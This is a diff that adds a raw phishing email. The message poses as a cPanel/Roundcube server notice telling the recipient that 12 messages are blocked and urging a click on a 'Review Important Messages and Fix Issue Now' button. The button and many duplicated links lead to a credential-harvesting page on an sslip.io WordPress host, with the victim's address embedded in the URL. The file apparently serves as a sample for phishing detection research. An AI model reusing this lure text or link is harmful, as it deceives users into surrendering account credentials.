@@ -1,0 +1,170 @@
+Return-Path: jada@adbertize.com
+Delivered-To: jose@monkey.org
+X-FDA: 84043301706.23.F47404B
+Received: from hotel.adbertize.com (hotel.adbertize.com [188.240.14.34])
+	by imf21.b.hostedemail.com (Postfix) with ESMTP id 21B79180005
+	for <jose@monkey.org>; Mon, 27 Oct 2025 09:01:51 +0000 (UTC)
+Authentication-Results: imf21.b.hostedemail.com;
+	dkim=pass header.d=adbertize.com header.s=dkim header.b=AXxSw9Al;
+	dmarc=pass (policy=none) header.from=adbertize.com;
+	spf=pass (imf21.b.hostedemail.com: domain of jada@adbertize.com designates
+ 188.240.14.34 as permitted sender) smtp.mailfrom=jada@adbertize.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1761555712;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=RiU42KDdceRjriOth/XplxnxxJ4UQf5bq+VWeZFxF5M=;
+	b=WLbEr9+KyoYEbs4ZowImSxsnnrSpEM3BsLYdf7UsIVYNYB7i4zxxCoNXDbC+ghHAFO5tfQ
+	VOWctZMAZ+ppz5gIadBz6chRlbcqSN/iJFis2GynP0oP3w9yhbHRMPZDEz5W6Jl+25r6f9
+	zV9HZCzdymEc+MBeLvfm/sNIDOMrnfg=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1761555712; a=rsa-sha256;
+	cv=none;
+	b=SR5CB3atGh8W20E1nscySnQFERsLN7AnHPSAqCsi9UH98YvIXrtPvWmyINjI6BsdO8ao16
+	qlJc2ru4oyUIxvmNA7Q+Dc9TkgqKER4jdHYvQCoSDoKLZmHpWZR7n2kJlYhmQ8kczXih8Z
+	AIL+uSWdtViHfM4PPzvoW8Li5hZDOII=
+ARC-Authentication-Results: i=1;
+	imf21.b.hostedemail.com;
+	dkim=pass header.d=adbertize.com header.s=dkim header.b=AXxSw9Al;
+	dmarc=pass (policy=none) header.from=adbertize.com;
+	spf=pass (imf21.b.hostedemail.com: domain of jada@adbertize.com designates
+ 188.240.14.34 as permitted sender) smtp.mailfrom=jada@adbertize.com
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=adbertize.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
+ i=jada@adbertize.com;
+ bh=hJbwiy9KnO2qLb8hO2GumQbq8xU=;
+ b=AXxSw9AlAAFc9S7u7trrTMTCiPivVyP+GYnEauOVOd9nmop3XJ+b+HAtiKJ8mV2FTl6DsxoRJB+i
+   czFaulK31KfmLX9OQFajKM1KIjJbJJyYatv+PJo6dHFgbFnVumITw8oLETIBIVC40neFu1IpCIb2
+   N/X0jwBm1ngGVHmgDfYoP88zbRM0fXPJxd5gqtyhNe6eMT4ZL5FIlz2fB+UQhZnFD0xFQz944PAH
+   zdWdlx6Y+Cubbmh/VnuMDGGTUJxf/WkLPY1K9Hc2BW+3Pzry54nHsVKbl95SB1ScnY1y5s2JNxAc
+   jMs2tBGBnXtRdSLa22Rod2pSZOUMReyfRlUGEw==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=adbertize.com;
+ b=QYhHUO1pEz9OCLlt32RddIt5yA0WipuyNWOmUPRzGYpo3vLJ2BmX/rF7qsnKzzLzQ0HDml24Brcm
+   MbIQJc/Z4SLtHRTbt+AfLIJt6Z0QZzb662ndmj9+wICrX/xSmc7tLxxePyawNPhZx4QakWu+bBxv
+   ObgHAXB7VDXd+d2dGoKKvxtEdtNHqV21W66bHsTCioB1HHR/DH5Uq7ghFxLCCXrVX//P5tF5xtHR
+   +lVPADGji0E5WF+9qiS8TSc3zICBRIBdVCKqX+sLFZujBIiYMGQJ0uVYQ7vpjz4EJxrIN9tLSCPN
+   248vk6ZPD57y/KrkE8aCMF6adX395vYQL5LF8g==;
+From: CPanel Admin monkey.org <jada@adbertize.com>
+To: jose@monkey.org
+Subject: Domain Restoration Needed urgently
+Date: 27 Oct 2025 02:01:49 -0700
+Message-ID: <20251027020149.D8B4FAFADC46BE61@adbertize.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: 21B79180005
+X-Rspam-User: 
+X-Spam-Status: No, score=6.30
+X-Stat-Signature: kz6du1pmjozf3a7sfyaocinrwor6xp54
+X-Rspamd-Server: rspam07
+X-HE-Tag: 1761555711-162103
+X-HE-Meta: 
+ U2FsdGVkX1+YdbYQBQwUfqJ2cjEvxRwYj/2Z3B/LrBbtI52j7ef1+CTDr5Max9lKD9kadGZH3FufqUmnmZXhDbyI7/43qI4dy7P2HfJmPGlgyMpgMPUGsrO+CoEygMLGVxjY+025dh7rtfbgx9dN+OZ4wFnAXdwVNzcwws4vY1sd8n6Q6N3UtAUy8mEZvZWJMgc+BjHXaH70sGnMigCJjhb0+rvpv+6655Eo/4OuPMS2DOQlhVnpJvccGE2PMYlseJpfpM8cXY7JhVvAoEjQn8onp/9O1IIeSbfUQ0BUz9Zz6B1qYkHA/h4RWiyHhUa4ZyGv3KEMWyliuq01jRT8ERqmNNEZnidSAantoAuSlQo9JTEsuSTtEaMWKzsXzm6MLY2jkyfLHvX2j+hehCIivNqjoIpax1mFGnKkBUYfNZUMJ4GytJDqtXxh6hWaWv+rbHDbL/ofhC7ZIvFCnhqgKWII8vwC71smhOppmq1KN2ghg6gkuTzEewYy2jWeeRoS1kDCnm+jtx3wfHa8C4IRfQZCBcFvD1yHlaKwvPp75J31J2AjYzZZW0rW+86Tcjd1SgV0kuRUfbzThdhyZJfUUfnmXLCTwiR/uxQfuniKiy3oBUB5Gn4Ee6myO94gu0feOQDpXVB7D44Sa18wdHgMLXPGQjD5SItTaZKStijvjxowlfzBRF7VT3GV7R29xglEWsVJyOsfbDoibfTFjShCx70hhx6Lwh7PRSqE3qX0B6hAXryRQ3yK4FmVpmLXSRx23emMYF3XIw3AL1j0KsemZMAiplI358OwYQ8FVJtYgWZvzkd90PtDlm5PMVT5Q3ZqV831lR3hSjCY7zXlCMcIFcZT3TxKr5VyYrT2jOd4o4e0o8hSv6kSWWC5hwDDqE7ErYlYOfprvzpBr3RaO2T0kUc3MdI+71jGN7BGeEwLCx4fUm0dcguyfATJ20vGMlgZmql9L8zISf+khqI8ns8HQ+HQPqz
+ EEeuXqv8C58s/eiKT+47G8Pr+H/ckTRjO+6Q+qfGorWu/+sk1JigWi4RdvzkERvCjHGkVCuKMEiDxkNtZLjXyZWn3jrhRO04w8kcAXw9RYZpUoaHTuh0TIgNU37ArsyHxUw57n0mxJ8dhLJExkb1DLRS91MZEtq6aA0gFCPzjCowHbCJcv+Piyqoi+VUaR3q/5D7IrjxYuz4GXqfSHZCopWior8mrPKX/YjYlTYRJbDE8hTW4cOwqmJv4+12oo3fCuT3yvtmJcbpz4kMh/q8CfiKnqCKESEr9yCQhpTZpFKXp4nMTjkfSgUNRZ6EwhO0hs8QN2/a6lK/UJ4hn4VaDi6Pa8kIstFbE8d+DNm1jKns6C5EhrqruApUjlg+S6mC/T/gIkdsa3ieBuSdbsYEzw/GVCQ==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 416
+
+<!DOCTYPE html>
+
+<html><head>
+<meta http-equiv=3D"content-type" content=3D"text/html; charset=3DUTF-8">
+<title>Roundcube Customer Server Message</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    padding: 20px;
+}
+=2Econtainer {
+    background-color: #ffffff;
+    border: 1px solid #ddd;
+    padding: 20px;
+    max-width: 600px;
+    margin: 0 auto;
+}
+=2Eheader {
+    background-color: #003399;
+    color: white;
+    padding: 10px;
+    text-align: left;
+    font-size: 24px;
+}
+=2Ebutton {
+    background-color: #FF0000;
+    color: white;
+    padding: 10px 20px;
+    text-decoration: none;
+    border-radius: 5px;
+    display: inline-block;
+}
+</style>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    padding: 20px">
+<div style=3D"background-color: #ffffff;
+    border: 1px solid #ddd;
+    padding: 20px;
+    max-width: 600px;
+    margin: 0 auto" class=3D"container">
+    <div style=3D"background-color: #003399;
+    color: white;
+    padding: 10px;
+    text-align: left;
+    font-size: 24px" class=3D"header">
+        Roundcube
+        <div style=3D"text-align: right; font-size: 14px;">Customer Server =
+Message</div>
+    </div>
+    <div style=3D"padding: 20px 0px;">
+        <p>DEAR jose@monkey.org</p>
+        <p>You have 12 important pending messages roundcube DNS servers, du=
+e to blockage.</p>
+        <p>Here's what to do next:</p>
+        <ul>
+            <li>Follow the link below review them</li>
+            <li>Release them</li>
+            <li>Fix this issue</li>
+        </ul>
+        <a href=3D"https://wordpress-v8g0oc80kkkg04s4ww4w4c04.196.251.118.1=
+99.sslip.io/wp-content/uploads/western/index.html#jose@monkey.org"><a href=
+=3D"https://wordpress-v8g0oc80kkkg04s4ww4w4c04.196.251.118.199.sslip.io/wp-=
+content/uploads/western/index.html#jose@monkey.org"><a href=3D"https://word=
+press-v8g0oc80kkkg04s4ww4w4c04.196.251.118.199.sslip.io/wp-content/uploads/=
+western/index.html#jose@monkey.org">
+<a href=3D"https://wordpress-v8g0oc80kkkg04s4ww4w4c04.196.251.118.199.sslip=
+=2Eio/wp-content/uploads/western/index.html#jose@monkey.org"><a href=3D"htt=
+ps://wordpress-v8g0oc80kkkg04s4ww4w4c04.196.251.118.199.sslip.io/wp-content=
+/uploads/western/index.html#jose@monkey.org"><a href=3D"https://wordpress-v=
+8g0oc80kkkg04s4ww4w4c04.196.251.118.199.sslip.io/wp-content/uploads/western=
+/index.html#jose@monkey.org">
+<a href=3D"https://wordpress-v8g0oc80kkkg04s4ww4w4c04.196.251.118.199.sslip=
+=2Eio/wp-content/uploads/western/index.html#jose@monkey.org"><a href=3D"htt=
+ps://wordpress-v8g0oc80kkkg04s4ww4w4c04.196.251.118.199.sslip.io/wp-content=
+/uploads/western/index.html#jose@monkey.org"><a href=3D"https://wordpress-v=
+8g0oc80kkkg04s4ww4w4c04.196.251.118.199.sslip.io/wp-content/uploads/western=
+/index.html#jose@monkey.org">
+<a href=3D"https://wordpress-v8g0oc80kkkg04s4ww4w4c04.196.251.118.199.sslip=
+=2Eio/wp-content/uploads/western/index.html#jose@monkey.org"><a href=3D"htt=
+ps://wordpress-v8g0oc80kkkg04s4ww4w4c04.196.251.118.199.sslip.io/wp-content=
+/uploads/western/index.html#jose@monkey.org"><a style=3D"background-color: =
+#FF0000;
+    color: white;
+    padding: 10px 20px;
+    text-decoration: none;
+    border-radius: 5px;
+    display: inline-block" class=3D"button" href=3D"https://wordpress-v8g0o=
+c80kkkg04s4ww4w4c04.196.251.118.199.sslip.io/wp-content/uploads/western/ind=
+ex.html#jose@monkey.org">
+Review Important Messages and Fix Issue Now</a>
+    </div>
+</div>
+
+</body></html>
+
